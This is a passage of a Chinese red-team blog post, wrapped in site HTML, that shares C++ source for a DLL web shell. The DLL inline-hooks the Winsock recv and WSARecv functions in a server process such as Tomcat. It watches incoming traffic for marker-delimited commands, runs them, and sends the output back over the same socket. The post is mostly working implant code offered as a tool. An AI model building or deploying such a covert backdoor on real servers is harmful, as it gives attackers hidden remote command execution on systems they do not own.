class="keyword">sizeof</span>(WSARecvEntryPointInstHook));</span><br><span class="line"></span><br><span class="line">	VirtualProtect((LPVOID) FuncAddress, dwInstSize, OldProtect, &amp;OldProtect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="UninstallHook"><a href="#UninstallHook" class="headerlink" title="UninstallHook"></a>UninstallHook</h2><p>卸载钩子</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UninstallHook</span><span class="params">(LPCWSTR lpModule, LPCSTR lpFuncName)</span> </span>&#123;</span><br><span class="line">	UINT64 FuncAddress = (UINT64) GetProcAddress(GetModuleHandleW(lpModule), lpFuncName);</span><br><span class="line">	DWORD OldProtect = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(VirtualProtect((LPVOID) FuncAddress, dwInstSize, PAGE_EXECUTE_READWRITE, &amp;OldProtect))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName, <span class="string">"recv"</span>)) </span><br><span class="line">			<span class="built_in">memcpy</span>((LPVOID) FuncAddress, RecvEntryPointInst, <span class="keyword">sizeof</span>(RecvEntryPointInst));</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(lpFuncName,<span class="string">"WSARecv"</span>))</span><br><span class="line">			<span class="built_in">memcpy</span>((LPVOID) FuncAddress, WSARecvEntryPointInst, <span class="keyword">sizeof</span>(WSARecvEntryPointInst));</span><br><span class="line">	&#125;</span><br><span class="line">	VirtualProtect((LPVOID) FuncAddress, dwInstSize, OldProtect, &amp;OldProtect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="HookRecv"><a href="#HookRecv" class="headerlink" title="HookRecv"></a>HookRecv</h2><p>hook recv 的函数，程序在执行 recv 时，会先进入这个函数。</p>
+<p>在这个函数里，调用原来的 recv 获取数据，判断是否有<code>START_BLOCK</code>、<code>END_BLOCK</code>块，有的话就取出块之间的命令，执行。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">HookRecv</span><span class="params">(SOCKET s, <span class="keyword">char</span>* buf, <span class="keyword">int</span> len, <span class="keyword">int</span> flags)</span> </span>&#123;</span><br><span class="line">	UninstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"recv"</span>);</span><br><span class="line"></span><br><span class="line">	PFNRecv pfnRecv = (PFNRecv) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"recv"</span>);</span><br><span class="line">	PFNSend pfnSend = (PFNSend) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"send"</span>);</span><br><span class="line">	PFNClosesocket pfnClosesocket = (PFNClosesocket) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"closesocket"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> rc = pfnRecv(s, buf, len, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span>* startBlock = <span class="built_in">strstr</span>(buf, START_BLOCK);</span><br><span class="line">	<span class="keyword">if</span>(startBlock) &#123;</span><br><span class="line">		<span class="keyword">char</span>* endBlock = <span class="built_in">strstr</span>(startBlock, END_BLOCK);</span><br><span class="line">		<span class="keyword">if</span>(endBlock) &#123;</span><br><span class="line">			<span class="built_in">std</span>::<span class="built_in">string</span> start_block = <span class="built_in">std</span>::<span class="built_in">string</span>(startBlock);</span><br><span class="line">			<span class="keyword">int</span> endOffset = start_block.find(END_BLOCK, <span class="keyword">sizeof</span>(START_BLOCK));</span><br><span class="line">			<span class="built_in">std</span>::<span class="built_in">string</span> cmd = start_block.substr(<span class="keyword">sizeof</span>(START_BLOCK) - <span class="number">1</span>, start_block.size() - <span class="keyword">sizeof</span>(START_BLOCK) - ( start_block.size() - endOffset ) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">			<span class="built_in">std</span>::<span class="built_in">string</span> output = WSTR2STR(ExecuteCmd(cmd));</span><br><span class="line"></span><br><span class="line">			pfnSend(s, (<span class="keyword">char</span>*) output.c_str(), output.size(), <span class="number">0</span>);</span><br><span class="line">         pfnClosesocket(s);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	InstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"recv"</span>, (LPVOID) HookRecv);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span>  rc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">HookWSARecv</span><span class="params">(SOCKET s, LPWSABUF lpBuffer, DWORD dwBufferCount, LPDWORD lpNumberOfBytesRecvd, LPDWORD lpFlags, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	UninstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"WSARecv"</span>);</span><br><span class="line"></span><br><span class="line">	PFNWSARecv pfnWSARecv = (PFNWSARecv) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"WSARecv"</span>);</span><br><span class="line">	PFNWSASend pfnWSASend = (PFNWSASend) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"WSASend"</span>);</span><br><span class="line">	PFNClosesocket pfnClosesocket = (PFNClosesocket) GetProcAddress(GetModuleHandleW(<span class="string">L"ws2_32.dll"</span>), <span class="string">"closesocket"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> rc = pfnWSARecv(s, lpBuffer, dwBufferCount, lpNumberOfBytesRecvd, lpFlags, lpOverlapped, lpCompletionRoutine);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span>* startBlock = <span class="built_in">strstr</span>(lpBuffer-&gt;buf, START_BLOCK);</span><br><span class="line">	<span class="keyword">if</span>(startBlock) &#123;</span><br><span class="line">		<span class="keyword">char</span>* endBlock = <span class="built_in">strstr</span>(startBlock, END_BLOCK);</span><br><span class="line">		<span class="keyword">if</span>(endBlock) &#123;</span><br><span class="line">			<span class="built_in">std</span>::<span class="built_in">string</span> start_block = <span class="built_in">std</span>::<span class="built_in">string</span>(startBlock);</span><br><span class="line">			<span class="keyword">int</span> endOffset = start_block.find(END_BLOCK, <span class="keyword">sizeof</span>(START_BLOCK));</span><br><span class="line">			<span class="built_in">std</span>::<span class="built_in">string</span> cmd = start_block.substr(<span class="keyword">sizeof</span>(START_BLOCK) - <span class="number">1</span>, start_block.size() - <span class="keyword">sizeof</span>(START_BLOCK) - ( start_block.size() - endOffset ) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">			WSABUF outBuf;</span><br><span class="line">			<span class="built_in">std</span>::<span class="built_in">string</span> output = WSTR2STR(ExecuteCmd(cmd));</span><br><span class="line">			outBuf.buf = (<span class="keyword">char</span>*) output.c_str();</span><br><span class="line">			outBuf.len = output.size();</span><br><span class="line"></span><br><span class="line">			pfnWSASend(s, &amp;outBuf, <span class="number">1</span>, lpNumberOfBytesRecvd, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">         pfnClosesocket(s);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	InstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"WSARecv"</span>, (LPVOID) HookWSARecv);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span>  rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这里还 hook 了 <code>WSARecv</code> ，是因为我在 Tomcat 上测试遇到个问题  hook <code>recv</code> 后收到的数据是乱码，长度也对不上。 后来想到 Tomcat 现在默认是 NIO 处理，JVM 的用的 API 可能不一样，翻看了一下源码，发现 Windows 上 NIO 相关的 socket 操作函数实际用的是 <code>WSARecv</code>、<code>WSASend</code> 等带 <code>WSA</code> 前缀的，加了 hook 点之后能正常读到数据了。</p>
+</blockquote>
+<h2 id="DllMain"><a href="#DllMain" class="headerlink" title="DllMain"></a>DllMain</h2><p>DLL 入口，调用安装钩子</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">switch</span>(fdwReason)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">		InstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"recv"</span>, (LPVOID) HookRecv);</span><br><span class="line">		InstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"WSARecv"</span>, (LPVOID) HookWSARecv);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p><img src="/2021/07/01/use-inlinehook-technology-to-make-a-more-general-webshell/java.gif" alt="java"></p>
+<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p><img src="/2021/07/01/use-inlinehook-technology-to-make-a-more-general-webshell/python.gif" alt="python"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/RedTeam/">RedTeam</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/工具分享/">工具分享</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/开发/">开发</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/红蓝对抗/">红蓝对抗</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+  
+    <nav id="page-nav">
+      <span class="page-number current">1</span><a class="page-number" href="page/2/">2</a><a class="page-number" href="page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="page/6/">6</a><a class="extend next" rel="next" href="page/2/">Next &raquo;</a>
+    </nav>
+  
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2018-2023 Jayl1n
+            </div>
+            <div class="footer-right">
+                <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("07/31/2018 00:00:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 20;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
